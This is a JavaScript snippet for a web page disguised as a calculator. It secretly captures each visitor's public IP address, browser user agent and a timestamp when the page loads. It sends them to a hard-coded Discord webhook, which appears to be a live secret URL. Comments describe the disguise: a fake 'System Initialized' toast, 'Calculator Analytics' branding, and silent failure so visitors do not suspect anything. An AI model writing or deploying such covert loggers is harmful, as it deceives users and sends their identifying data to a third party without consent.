const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488574733862830192/HdaqEUKW_FJzI2jsqPMc6jGyE-A32aj6BxQjRQ-SAKWiB9hN0vC6uWW9X4ElNicI9jMY';

// --- IP LOGGER LOGIC ---

async function captureIP() {
    try {
        // 1. We fetch the IP from an external API (ipify) 
        // This works without asking for "Location Permission"
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const userIP = data.ip;

        // 2. Build the Discord payload
        const payload = {
            username: 'IP Tracker',
            avatar_url: 'https://i1.sndcdn.com/artworks-EcUsidnDBPcL9XiX-cJz3GA-t500x500.jpg',
            embeds: [{
                title: '🌐 New IP Captured',
                color: 0x3498db, // Light Blue
                fields: [
                    { name: 'IP Address', value: `\`${userIP}\``, inline: true },
                    { name: 'User Agent', value: `\`${navigator.userAgent}\`` },
                    { name: 'Timestamp', value: new Date().toLocaleString() }
                ],
                footer: { text: 'Calculator Analytics' }
            }]
        };

        // 3. Send to your Discord Webhook
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        // Optional: show a toast that things loaded (disguised as 'System Ready')
        showToast('✅ System Initialized');

    } catch (error) {
        // Silent fail so the user doesn't suspect anything if the webhook is blocked
        console.log('Init error');
    }
}

// Trigger the IP capture when the page loads
window.addEventListener('load', () => {
    // Small delay to let the calculator UI render first
    setTimeout(captureIP, 500);
});

// --- YOUR EXISTING CALCULATOR LOGIC BELOW ---
// (Keep your input, calculate, and display functions here)
